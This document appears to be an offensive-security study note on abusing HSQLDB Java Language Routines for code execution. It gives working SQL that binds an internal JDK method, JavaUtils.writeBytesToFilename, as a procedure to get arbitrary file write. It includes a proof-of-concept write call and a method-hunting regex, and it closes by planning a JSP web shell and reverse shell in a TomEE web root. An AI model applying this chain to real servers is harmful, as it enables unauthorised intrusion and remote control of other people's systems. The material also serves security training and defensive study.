# Java Language Routines

From HSQLDB, we can call static methods of a Java class using Java Language Routines (JRTs). When doing so, we can only use certain variable types that are mostly primitives and simple objects that map between Java and SQL types. 

JRTs can be defined as functions or procedures

- **Functions** can be used as part of normal SQL statement if Java method returns variable.
- If Java method returns void, need to use a **procedure** that is invoked with a `CALL` statement.

## POC

Create a POC function that enables us to check system properties by calling`System.getProperty()` method. This method call takes in a String value and returns a String value. We’ll run this SQL code to create our function in the HSQLDB manager GUI. 

```sql
CREATE FUNCTION systemprop(IN key VARCHAR) RETURNS VARCHAR 
LANGUAGE JAVA 
DETERMINISTIC NO SQL
EXTERNAL NAME 'CLASSPATH:java.lang.System.getProperty'
```

Once the function is called, we need to call it. Unlike a table called with SELECT, we call the function using a VALUES without specifying a SELECT from a table. We pass in `java.class.path`as our parameter. 

```sql
VALUES(systemprop('java.class.path'))

Output:
./hsqldb.jar
```

A java process always has access to default Java classes. If we want to use a function or procedure for anything malicious, we need a method in `hssqldb.jar` or in the core Java files.

1. The method must be static
2. Method parameters must be primitives or types that map to SQL types
3. Method must return a primitive, object that maps to an SQL type, or void. All java classes must return something. 
4. The method must run code directly or write files to the system. 

## Code Inspection

We can use jd-gui to search for methods. Prior to Java v9, standard classes were stored in `lib/rt.jar` (and now just stored in any file in the `lib` directory). We’ll transfer the file out of the target host, export the source files out of GD-GUI and open with VSCode. 

We search for methods that are public, static, return void and take a string as a parameter

```sql
public static void \w+\(String
```

Among them, we find `writeBytesToFilename`, which provides us with arbitrary file write. 

```sql
public static void writeBytesToFilename(String paramString, byte[] paramArrayOfbyte) {
    FileOutputStream fileOutputStream = null;
    try {
    if (paramString != null && paramArrayOfbyte != null) {
        File file = new File(paramString);
        
        fileOutputStream = new FileOutputStream(file);
        
        fileOutputStream.write(paramArrayOfbyte);
        fileOutputStream.close();
    }
    else if (log.isLoggable(Level.FINE)) {
        log.log(Level.FINE, "writeBytesToFilename got null byte[] pointed");
    }
    
    } catch (IOException iOException) {
    if (fileOutputStream != null) {
        try {
        fileOutputStream.close();
        } catch (IOException iOException1) {
        if (log.isLoggable(Level.FINE)) {
            log.log(Level.FINE, iOException1.getMessage(), iOException1);
        }
        } 
    }
    } 
}
```

Since this method returns void, we can call it from a procedure. To call it, we should provide a string value (file name) and a byte array (file contents). We’ll create a new procedure that uses a VARCHAR for the `paramString` parameter and a VARBINARY for the `paramArrayOfByte` parameter. The VAR prefix in Java allows us to define **variable-length** strings. We set the size of the VARBINARY to 1024 for sufficient length for the payload. 

```sql
CREATE PROCEDURE writeBytesToFilename(IN paramString VARCHAR, IN paramArrayOfByte 
VARBINARY(1024)) 
LANGUAGE JAVA 
DETERMINISTIC NO SQL
EXTERNAL NAME 
'CLASSPATH:com.sun.org.apache.xml.internal.security.utils.JavaUtils.writeBytesToFilename'
```

When we prepare our payload, we can use the Decoder tool in Burp Suite to prepare a POC by converting to ASCII hex. 

```sql
call writeBytesToFilename ('test.txt', cast('546573742053756363657373' AS VARBINARY(1024)))
```

## JSP Shell

Now that we have file write functionality, we can write a JSP web shell into the web root, `~/crx/apache-tomee-plus-7.0.5/webapps/ROOT`. From there, we can send a reverse shell through the JSP web shell.